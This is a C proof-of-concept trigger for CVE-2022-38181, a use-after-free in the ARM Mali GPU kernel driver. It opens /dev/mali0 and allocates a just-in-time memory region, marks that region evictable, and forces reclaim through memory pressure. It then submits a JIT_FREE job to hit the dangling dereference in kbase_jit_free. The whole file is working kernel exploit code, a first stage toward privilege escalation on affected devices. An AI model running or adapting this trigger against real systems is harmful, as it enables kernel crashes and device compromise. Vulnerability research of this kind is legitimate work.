#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define KBASE_IOCTL_TYPE 0x80
#define BASE_UK_VERSION_MAJOR 11
#define BASE_UK_VERSION_MINOR 11
#define BASE_MEM_PROT_CPU_RD ((uint64_t)1 << 0)
#define BASE_MEM_PROT_CPU_WR ((uint64_t)1 << 1)
#define BASE_MEM_PROT_GPU_RD ((uint64_t)1 << 2)
#define BASE_MEM_PROT_GPU_WR ((uint64_t)1 << 3)
#define BASE_MEM_DONT_NEED ((uint64_t)1 << 17)
#define BASE_JD_REQ_SOFT_JOB ((uint32_t)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE (BASE_JD_REQ_SOFT_JOB | 0xa)

struct version_check { uint16_t major; uint16_t minor; };
struct set_flags_s { uint32_t create_flags; };
struct job_submit_s { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
union mem_alloc_u {
	struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
	struct { uint64_t flags; uint64_t gpu_addr; } out;
};
struct mem_jit_init_s { uint64_t va_pages; uint8_t max_allocations; uint8_t trim_level; uint8_t padding[6]; };
struct mem_flags_change_s { uint64_t gpu_va; uint64_t flags; uint64_t mask; };

struct atom_v2 {
	uint64_t jc;
	uint64_t udata[2];
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	uint8_t pre_dep[4];
	uint8_t atom_number;
	uint8_t prio;
	uint8_t device_nr;
	uint8_t pad1;
	uint32_t core_req;
};

struct jit_alloc_info {
	uint64_t gpu_alloc_addr;
	uint64_t va_pages;
	uint64_t commit_pages;
	uint64_t extent;
	uint8_t id;
	uint8_t bin_id;
	uint8_t max_allocations;
	uint8_t flags;
	uint8_t padding[2];
	uint16_t usage_id;
};

_Static_assert(sizeof(struct version_check) == 4, "vc");
_Static_assert(sizeof(struct set_flags_s) == 4, "sf");
_Static_assert(sizeof(struct job_submit_s) == 16, "js");
_Static_assert(sizeof(union mem_alloc_u) == 32, "ma");
_Static_assert(sizeof(struct mem_jit_init_s) == 16, "ji");
_Static_assert(sizeof(struct mem_flags_change_s) == 24, "fc");
_Static_assert(sizeof(struct atom_v2) == 48, "atom");
_Static_assert(sizeof(struct jit_alloc_info) == 40, "info");

#define IOC(d, t, n, s) ((d) << 30 | (s) << 16 | (t) << 8 | (n))
#define IOCTL_VERSION_CHECK IOC(3, KBASE_IOCTL_TYPE, 0, 4)
#define IOCTL_SET_FLAGS IOC(1, KBASE_IOCTL_TYPE, 1, 4)
#define IOCTL_JOB_SUBMIT IOC(1, KBASE_IOCTL_TYPE, 2, 16)
#define IOCTL_MEM_ALLOC IOC(3, KBASE_IOCTL_TYPE, 5, 32)
#define IOCTL_MEM_JIT_INIT IOC(1, KBASE_IOCTL_TYPE, 14, 16)
#define IOCTL_MEM_FLAGS_CHANGE IOC(1, KBASE_IOCTL_TYPE, 23, 24)

#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)

static int submit_atom(int fd, struct atom_v2 *a)
{
	struct job_submit_s js = { (uint64_t)(uintptr_t)a, 1, sizeof(*a) };
	return ioctl(fd, IOCTL_JOB_SUBMIT, &js);
}

static int pressure_mb = 1800;

static void pressure(void)
{
	pid_t p = fork();
	if (p == 0) {
		int chunks = pressure_mb / 16;
		for (int i = 0; i < chunks; i++) {
			void *m = mmap(NULL, 16UL << 20, PROT_READ | PROT_WRITE,
					MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
			if (m == MAP_FAILED)
				break;
		}
		_exit(0);
	}
	int st;
	waitpid(p, &st, 0);
	LOG("[+] pressure child done (status %d)\n", st);
}

static int control_test(int fd)
{
	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = 0x10;
	ma.in.commit_pages = 0x10;
	ma.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0) {
		LOG("[-] control MEM_ALLOC: %s\n", strerror(errno));
		return 1;
	}
	LOG("[+] control region gpu_va=0x%llx\n", (unsigned long long)ma.out.gpu_addr);
	struct mem_flags_change_s fc;
	fc.gpu_va = ma.out.gpu_addr;
	fc.flags = BASE_MEM_DONT_NEED;
	fc.mask = BASE_MEM_DONT_NEED;
	if (ioctl(fd, IOCTL_MEM_FLAGS_CHANGE, &fc) != 0) {
		LOG("[-] control DONT_NEED: %s\n", strerror(errno));
		return 1;
	}
	LOG("[+] control region marked DONT_NEED, applying pressure...\n");
	pressure();
	sleep(3);
	LOG("[+] CONTROL SURVIVED pressure with normal evictable region\n");
	return 0;
}

int main(int argc, char **argv)
{
	LOG("[*] mustang CVE-2022-38181 stage-1 trigger (kbase r26p0)\n");
	if (argc > 1 && strcmp(argv[1], "pressure") == 0) {
		if (argc > 2) pressure_mb = atoi(argv[2]);
		LOG("[*] raw pressure test, %d MB\n", pressure_mb);
		pressure();
		sleep(3);
		LOG("[+] PRESSURE-ONLY SURVIVED\n");
		return 0;
	}

	int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) { LOG("[-] open mali0: %s\n", strerror(errno)); return 1; }
	LOG("[+] /dev/mali0 opened fd=%d\n", fd);

	struct version_check vc = { BASE_UK_VERSION_MAJOR, BASE_UK_VERSION_MINOR };
	if (ioctl(fd, IOCTL_VERSION_CHECK, &vc) == 0)
		LOG("[+] handshake ok: %u.%u\n", vc.major, vc.minor);
	else
		LOG("[!] handshake: %s (continuing)\n", strerror(errno));

	struct set_flags_s sf = { 0 };
	ioctl(fd, IOCTL_SET_FLAGS, &sf);

	void *track = mmap(NULL, 4096, PROT_NONE, MAP_SHARED, fd, 3ull << 12);
	if (track == MAP_FAILED) {
		LOG("[-] tracking page mmap: %s\n", strerror(errno));
		return 1;
	}
	LOG("[+] tracking page mapped at %p\n", track);

	if (argc > 1 && strcmp(argv[1], "control") == 0) {
		if (argc > 2) pressure_mb = atoi(argv[2]);
		int ret = control_test(fd);
		close(fd);
		return ret;
	}

	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = 1;
	ma.in.commit_pages = 1;
	ma.in.extent = 0;
	ma.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0) {
		LOG("[-] MEM_ALLOC scratch: %s\n", strerror(errno));
		return 1;
	}
	uint64_t scratch_gpu = ma.out.gpu_addr;
	LOG("[+] scratch gpu_va=0x%llx\n", (unsigned long long)scratch_gpu);
	void *scratch_cpu = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, scratch_gpu);
	if (scratch_cpu == MAP_FAILED) {
		LOG("[-] mmap scratch: %s\n", strerror(errno));
		return 1;
	}
	*(volatile uint64_t *)scratch_cpu = 0;

	struct mem_jit_init_s ji;
	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 64;
	ji.trim_level = 0;
	if (ioctl(fd, IOCTL_MEM_JIT_INIT, &ji) != 0) {
		LOG("[-] MEM_JIT_INIT: %s\n", strerror(errno));
		return 1;
	}
	LOG("[+] jit pool initialized\n");

	if (argc > 1 && strcmp(argv[1], "jit") == 0 && argc > 2)
		pressure_mb = atoi(argv[2]);

	for (int attempt = 1; attempt <= 3; attempt++) {
		uint8_t id = (uint8_t)attempt;

		struct jit_alloc_info info;
		memset(&info, 0, sizeof(info));
		info.gpu_alloc_addr = scratch_gpu;
		info.va_pages = 0x40;
		info.commit_pages = 0x10;
		info.extent = 0x10;
		info.id = id;
		info.bin_id = 1;

		struct atom_v2 a;
		memset(&a, 0, sizeof(a));
		a.jc = (uint64_t)(uintptr_t)&info;
		a.nr_extres = 1;
		a.atom_number = (uint8_t)attempt;
		a.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
		if (submit_atom(fd, &a) != 0) {
			LOG("[-] jit alloc submit: %s\n", strerror(errno));
			return 1;
		}
		sleep(1);
		uint64_t jit_va = *(volatile uint64_t *)scratch_cpu;
		LOG("[+] attempt %d: jit id=%u gpu_va=0x%llx\n", attempt, id, (unsigned long long)jit_va);
		if (!jit_va || (jit_va & 0xfff)) {
			LOG("[-] bad jit va, retrying\n");
			continue;
		}

		struct mem_flags_change_s fc;
		fc.gpu_va = jit_va;
		fc.flags = BASE_MEM_DONT_NEED;
		fc.mask = BASE_MEM_DONT_NEED;
		if (ioctl(fd, IOCTL_MEM_FLAGS_CHANGE, &fc) != 0) {
			LOG("[-] MEM_FLAGS_CHANGE: %s\n", strerror(errno));
			continue;
		}
		LOG("[+] region marked DONT_NEED (evictable)\n");

		LOG("[*] triggering memory pressure + direct reclaim...\n");
		pressure();
		sleep(3);

		LOG("[*] submitting JIT_FREE on id=%u (dangling deref here)\n", id);
		uint8_t ids[2] = { id, 0 };
		struct atom_v2 f;
		memset(&f, 0, sizeof(f));
		f.jc = (uint64_t)(uintptr_t)ids;
		f.nr_extres = 1;
		f.atom_number = (uint8_t)(16 + attempt);
		f.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
		if (submit_atom(fd, &f) != 0) {
			LOG("[-] jit free submit: %s\n", strerror(errno));
			continue;
		}
		LOG("[*] FREE-SUBMITTED id=%u — if output stops now, kernel oopsed in kbase_jit_free\n", id);
		sleep(5);
		LOG("[+] survived attempt %d\n", attempt);
	}

	LOG("[*] stage-1 finished without oops\n");
	close(fd);
	return 0;
}
